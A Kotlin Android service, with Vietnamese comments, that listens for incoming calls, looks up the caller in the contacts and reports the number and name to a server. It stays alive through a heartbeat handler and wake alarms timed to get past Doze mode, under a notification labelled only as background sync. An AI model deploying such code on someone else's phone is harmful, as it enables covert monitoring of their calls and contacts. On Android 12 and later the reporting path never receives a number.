package com.example.informer

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.provider.ContactsContract
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat

class BackgroundMonitoringService : Service() {

    private lateinit var telephonyManager: TelephonyManager
    private var callStateCallback: CallStateCallbackImpl? = null
    private var lastReportedNumber: String? = null

    // KÊNH 1: Handler tạo nhịp xung nhẹ tuần hoàn chống cách ly tiến trình
    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            // Nhịp xung giả lập tác vụ hệ thống nhẹ nhàng (Cập nhật log tĩnh)
            Log.d("METIS_HEARTBEAT", "💓 Micro-pulse: Tiến trình duy trì sinh mệnh đang hoạt động bình thường.")
            // Lặp lại sau mỗi 15 giây - Khoảng thời gian vàng vừa đủ giữ App sống, vừa không tốn pin
            heartbeatHandler.postDelayed(this, 15000)
        }
    }

    // Định nghĩa bộ lắng nghe trạng thái cuộc gọi từ phần cứng
    private class CallStateCallbackImpl(
        private val onCallStateChangedAction: (state: Int, incomingNumber: String?) -> Unit
    ) : TelephonyCallback(), TelephonyCallback.CallStateListener {
        override fun onCallStateChanged(state: Int) {
            onCallStateChangedAction(state, null)
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundServiceNotification()
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        // 🔥 KÍCH HOẠT KÊNH 1: Khởi động mạch xung Handler ngầm
        heartbeatHandler.post(heartbeatRunnable)

        // 🔥 KÍCH HOẠT KÊNH 2: Cài đặt Neo lặp AlarmManager ở tầng lõi OS
        scheduleNextHeartbeatAlarm()

        // Xử lý bóc tách biến động cuộc gọi
        val stateChangedAction = { state: Int, incomingNumber: String? ->
            val activeNumber = incomingNumber
            when (state) {
                TelephonyManager.CALL_STATE_RINGING -> {
                    if (!activeNumber.isNullOrBlank() && activeNumber != lastReportedNumber) {
                        lastReportedNumber = activeNumber

                        val formattedNumber = MainActivity.formatVietnamesePhoneNumber(activeNumber)
                        val contactName = getContactName(applicationContext, activeNumber)

                        MainActivity.addLog("📞 Cuộc gọi đến: $activeNumber ($contactName)")

                        ServerReporter.sendEvent(
                            context = applicationContext,
                            type = "CALL",
                            incomingNumber = formattedNumber,
                            content = "Cuộc gọi đến từ: $contactName"
                        )
                    }
                }
                TelephonyManager.CALL_STATE_IDLE -> {
                    lastReportedNumber = null
                }
            }
        }

        // Đăng ký Callback với hệ thống
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            callStateCallback = CallStateCallbackImpl { state, incomingNumber ->
                stateChangedAction(state, incomingNumber)
            }
            callStateCallback?.let { telephonyManager.registerTelephonyCallback(mainExecutor, it) }
        } else {
            @Suppress("DEPRECATION")
            val legacyListener = object : android.telephony.PhoneStateListener() {
                override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                    stateChangedAction(state, incomingNumber)
                }
            }
            telephonyManager.listen(legacyListener, android.telephony.PhoneStateListener.LISTEN_CALL_STATE)
        }
    }

    // Thuật toán Neo lặp: Tự động lên lịch báo thức chính xác để ép OS mở luồng xử lý
    private fun scheduleNextHeartbeatAlarm() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, BackgroundMonitoringService::class.java)

            val pendingIntent = PendingIntent.getService(
                this,
                999,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            // Kích hoạt báo thức chính xác xuyên qua cả chế độ Doze Mode của Oppo
            val triggerTime = SystemClock.elapsedRealtime() + 60000 // Thức tỉnh định kỳ mỗi 1 phút

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent)
            }
        } catch (e: Exception) {
            Log.e("METIS_HEARTBEAT", "Không thể thiết lập Alarm Neo lặp: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundServiceNotification()

        // Mỗi lần AlarmManager gọi vào, ta lại gia hạn lịch cho chu kỳ tiếp theo
        scheduleNextHeartbeatAlarm()

        return START_STICKY
    }

    private fun getContactName(context: Context, phoneNumber: String): String {
        var contactName = "Số lạ (Chưa lưu)"
        val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
        val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
        try {
            context.contentResolver.query(uri, projection, null, null, null).use { cursor ->
                if (cursor != null && cursor.moveToFirst()) {
                    val nameIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                    if (nameIndex != -1) contactName = cursor.getString(nameIndex)
                }
            }
        } catch (e: Exception) {
            contactName = "Chưa cấp quyền danh bạ"
        }
        return contactName
    }

    override fun onDestroy() {
        // Hủy toàn bộ nhịp xung để tránh rò rỉ khi Service chủ động dừng
        heartbeatHandler.removeCallbacks(heartbeatRunnable)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            callStateCallback?.let { telephonyManager.unregisterTelephonyCallback(it) }
        } else {
            @Suppress("DEPRECATION")
            telephonyManager.listen(null, android.telephony.PhoneStateListener.LISTEN_NONE)
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundServiceNotification() {
        val channelId = "MONITOR_SERVICE_CHANNEL"
        val channelName = "Hệ thống đồng bộ ngầm"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_DEFAULT)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(chan)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setOngoing(true)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Hệ thống đồng bộ đang hoạt động")
            .setContentText("Thiết bị đang được kết nối ngầm liên tục...")
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()

        startForeground(101, notification)
    }
}